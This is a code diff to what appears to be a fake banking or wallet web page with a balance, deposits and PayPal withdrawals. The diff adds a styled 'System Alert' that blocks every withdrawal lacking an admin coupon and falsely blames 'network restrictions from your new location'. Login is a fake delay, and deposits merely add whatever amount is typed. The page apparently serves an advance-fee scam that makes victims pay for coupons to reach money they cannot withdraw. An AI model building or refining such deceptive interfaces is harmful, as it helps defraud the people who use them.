@@ -9,7 +9,7 @@
 <style>
 :root{
   --bg:#0b1220; --card:#0f172a; --line:#1e293b; --text:#e6eef7; --muted:#94a3b8;
-  --brand:#0a66ff; --brand2:#22d3ee; --ok:#10b981; --bad:#ef4444;
+  --brand:#0a66ff; --brand2:#22d3ee; --ok:#10b981; --bad:#ef4444; --warn:#f59e0b;
 }
 *{box-sizing:border-box}
 html,body{height:100%}
@@ -52,6 +52,17 @@ body{margin:0;background:
 @keyframes spin{to{transform:rotate(360deg)}}
 .loading{display:none;align-items:center;gap:10px;justify-content:center;margin-top:10px}
 .spin{width:22px;height:22px;border:3px solid rgba(255,255,255,.25);border-top:3px solid var(--brand);border-radius:50%;animation:spin 1s linear infinite}
+
+/* --- System Alert (styled popup) --- */
+.sysmask{position:fixed;inset:0;background:rgba(0,0,0,.55);display:none;align-items:center;justify-content:center;z-index:9999}
+.sysbox{width:min(92%,520px);background:#0c1526;border:1px solid #1e2f44;border-radius:16px;padding:18px;box-shadow:0 12px 36px rgba(0,0,0,.45)}
+.syshdr{display:flex;gap:10px;align-items:center;margin-bottom:10px}
+.sysicon{width:34px;height:34px;border-radius:10px;display:grid;place-items:center;
+  background:linear-gradient(135deg,#fb923c,#f59e0b);color:#0b1220;font-weight:900}
+.syshdr h3{margin:0;font-size:18px}
+.sysmsg{color:#dbeafe;line-height:1.5}
+.sysactions{display:flex;gap:10px;justify-content:flex-end;margin-top:14px}
+.sysactions .btn{min-width:120px}
 </style>
 </head>
 <body>
@@ -143,7 +154,7 @@ body{margin:0;background:
   </section>
 </main>
 
-<!-- MODALS -->
+<!-- DEPOSIT MODAL -->
 <div id="depositModal" class="modal" role="dialog" aria-modal="true">
   <div class="sheet">
     <h3>Deposit</h3>
@@ -158,6 +169,7 @@ body{margin:0;background:
   </div>
 </div>
 
+<!-- WITHDRAW MODAL -->
 <div id="withdrawModal" class="modal" role="dialog" aria-modal="true">
   <div class="sheet">
     <h3>Withdraw to PayPal</h3>
@@ -168,6 +180,22 @@ body{margin:0;background:
       <input id="wdCoupon" class="input" placeholder="Coupon code (required)" />
       <button id="wdSubmit" class="btn primary">Withdraw</button>
       <button class="btn ghost" data-close="#withdrawModal">Cancel</button>
+    </div>
+  </div>
+</div>
+
+<!-- SYSTEM ALERT (styled popup) -->
+<div id="sysAlert" class="sysmask" role="dialog" aria-modal="true" aria-labelledby="sysTitle">
+  <div class="sysbox">
+    <div class="syshdr">
+      <div class="sysicon">⚠️</div>
+      <h3 id="sysTitle">System Alert</h3>
+    </div>
+    <div id="sysMsg" class="sysmsg">
+      Activation requires a valid coupon due to network restrictions from your new location and regional internet service.
+    </div>
+    <div class="sysactions">
+      <button class="btn ghost" id="sysClose">Close</button>
     </div>
   </div>
 </div>
@@ -194,7 +222,6 @@ const toast = (msg)=>{ const t=$("#toast"); t.textContent=msg; t.style.display="
 /* =========================
    STATE (no auth persistence)
 ========================= */
-// App data may persist, auth never does.
 const save = (k,v)=>localStorage.setItem(k,JSON.stringify(v));
 const load = (k,d)=>{ try{const v=localStorage.getItem(k); return v?JSON.parse(v):d;}catch{return d;} };
 
@@ -250,7 +277,6 @@ $('#loginBtn').onclick = ()=>{
   if(!e || !p){ err.textContent = "Enter email and password."; return; }
   load.style.display='flex';
   $('#loginBtn').disabled = true;
-  // fake verify delay
   setTimeout(()=>{
     state.authed = true;      // set auth IN MEMORY only
     load.style.display='none';
@@ -271,9 +297,7 @@ window.addEventListener('beforeunload', forceLogout, {capture:true});
 function forceLogout(){
   state.authed = false;
   applyAuthUI();
-  // optional: also clear any modal
-  closeModal('#depositModal'); closeModal('#withdrawModal');
-  // scroll to top for clean login view
+  closeModal('#depositModal'); closeModal('#withdrawModal'); closeSysAlert();
   window.scrollTo({top:0,behavior:'instant'});
 }
 
@@ -290,7 +314,7 @@ function showTab(id){
    RENDERERS
 ========================= */
 function renderAll(){
-  $('#header-balance').textContent = fmt(state.balance);
+  headerBal.textContent = fmt(state.balance);
   $('#balance').textContent = fmt(state.balance);
   renderActivity();
   renderBanks();
@@ -361,7 +385,6 @@ function renderBanks(){
   });
 }
 $('#addBankBtn').onclick = ()=>{
-  // Reuse deposit modal for adding a bank quickly
   openDepositModal();
   $('#depAmount').value = "";
 };
@@ -396,12 +419,10 @@ $('#depSubmit').onclick = ()=>{
   const amt  = parseFloat(($('#depAmount').value||"0").replace(/,/g,""));
   if(!bank || !acct || !amt || amt<=0){ toast("Fill all deposit fields correctly"); return; }
 
-  // Save bank if new
   if(!state.banks.some(x=>x.name===bank && x.acct===acct)){
     state.banks.push({name:bank, acct});
     save('cb_banks', state.banks);
   }
-  // Apply deposit
   state.balance += amt;
   state.activity.unshift({t:"deposit", label:`Deposit from ${bank}`, amt:amt, date:new Date().toISOString().slice(0,10)});
   save('cb_balance', state.balance); save('cb_activity', state.activity);
@@ -411,7 +432,7 @@ $('#depSubmit').onclick = ()=>{
 };
 
 /* =========================
-   WITHDRAW (PayPal + coupon)
+   WITHDRAW (PayPal + coupon + SYSTEM ALERT)
 ========================= */
 function openWithdrawModal(){
   if(!state.authed) return;
@@ -426,11 +447,15 @@ $('#wdSubmit').onclick = ()=>{
   const email = $('#wdEmail').value.trim();
   const amt   = parseFloat(($('#wdAmount').value||"0").replace(/,/g,""));
   const coup  = $('#wdCoupon').value.trim();
-  if(!email || !amt || amt<=0 || !coup){ toast("Provide email, amount and coupon"); return; }
-  if(coup !== ADMIN_COUPON){ toast("Invalid coupon. Ask the administrator."); return; }
-  if(amt > state.balance){ toast("Amount exceeds balance"); return; }
-  const fee = Math.max(1200, Math.round(amt*0.01)); // 1% or min ₩1,200
 
+  // If coupon missing/invalid -> show styled System Alert and STOP.
+  if(!email || !amt || amt<=0 || !coup || coup !== ADMIN_COUPON){
+    showSysAlert("Activation requires a valid coupon due to network restrictions from your new location and regional internet service.");
+    return;
+  }
+  if(amt > state.balance){ toast("Amount exceeds balance"); return; }
+
+  const fee = Math.max(1200, Math.round(amt*0.01)); // 1% or min ₩1,200
   state.balance -= (amt + fee);
   state.activity.unshift({t:"withdrawal", label:`PayPal: ${email}`, amt:-amt, date:new Date().toISOString().slice(0,10)});
   state.activity.unshift({t:"fee", label:`Withdrawal Fee`, amt:-fee, date:new Date().toISOString().slice(0,10)});
@@ -439,6 +464,18 @@ $('#wdSubmit').onclick = ()=>{
   closeModal('#withdrawModal');
   toast("Withdrawal queued");
 };
+
+/* =========================
+   SYSTEM ALERT HELPERS
+========================= */
+function showSysAlert(message){
+  $('#sysMsg').textContent = message;
+  $('#sysAlert').style.display = 'flex';
+}
+function closeSysAlert(){
+  $('#sysAlert').style.display = 'none';
+}
+$('#sysClose').onclick = closeSysAlert;
 
 /* =========================
    MODAL HELPERS
